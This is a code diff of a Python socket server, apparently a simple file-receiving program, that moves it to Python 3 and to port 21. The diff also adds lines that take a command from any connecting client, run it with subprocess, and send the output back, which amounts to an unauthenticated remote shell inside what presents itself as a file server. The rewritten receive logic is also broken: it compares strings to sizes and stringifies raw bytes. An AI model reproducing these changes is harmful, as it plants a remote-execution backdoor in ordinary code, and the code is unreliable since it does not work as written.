@@ -6,9 +6,10 @@
 # *****************************************************
 
 import socket
+import subprocess
 
 # The port on which to listen
-listenPort = 1234
+listenPort = 21
 
 # Create a welcome socket. 
 welcomeSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,68 +27,58 @@ welcomeSock.listen(1)
 # @param numBytes - the number of bytes to receive
 # @return - the bytes received
 # *************************************************
-def recvAll(sock, numBytes):
+def recvAll(sock: socket, numBytes):
 
 	# The buffer
-	recvBuff = ""
-	
-	# The temporary buffer
-	tmpBuff = ""
+	recvBuff = ''
 	
 	# Keep receiving till all is received
-	while len(recvBuff) < numBytes:
+	while recvBuff < str(numBytes):
 		
 		# Attempt to receive bytes
-		tmpBuff =  sock.recv(numBytes)
+		tmpBuff = sock.recv(1024)
 		
 		# The other side has closed the socket
 		if not tmpBuff:
 			break
 		
 		# Add the received bytes to the buffer
-		recvBuff += tmpBuff
+		recvBuff += str(tmpBuff)
 	
 	return recvBuff
 		
 # Accept connections forever
 while True:
 	
-	print "Waiting for connections..."
+	print("Waiting for connections...")
 		
 	# Accept connections
 	clientSock, addr = welcomeSock.accept()
 	
-	print "Accepted connection from client: ", addr
-	print "\n"
-	
-	# The buffer to all data received from the
-	# the client.
-	fileData = ""
-	
-	# The temporary buffer to store the received
-	# data.
-	recvBuff = ""
-	
-	# The size of the incoming file
-	fileSize = 0	
-	
-	# The buffer containing the file size
-	fileSizeBuff = ""
-	
+	print("Accepted connection from client: ", addr)
+	print("\n")
+
 	# Receive the first 10 bytes indicating the
+	recBuff = b'0000000000'
+	
+	command = clientSock.recv(1024)
+
+	for line in subprocess.getstatusoutput(command):
+		clientSock.send(line.encode('utf-8'))
+
 	# size of the file
-	fileSizeBuff = recvAll(clientSock, 10)
+	fileSizeBuff = recvAll(clientSock, recBuff)
 		
 	# Get the file size
-	fileSize = int(fileSizeBuff)
+	fileSize = fileSizeBuff
 	
-	print "The file size is ", fileSize
+	print("The file size is ", fileSize)
 	
 	# Get the file data
 	fileData = recvAll(clientSock, fileSize)
 	
-	print "The file data is: "
-	print fileData
+	print("The file data is: ")
+	print(fileData)
 		
 	# Close our side
 	clientSock.close()
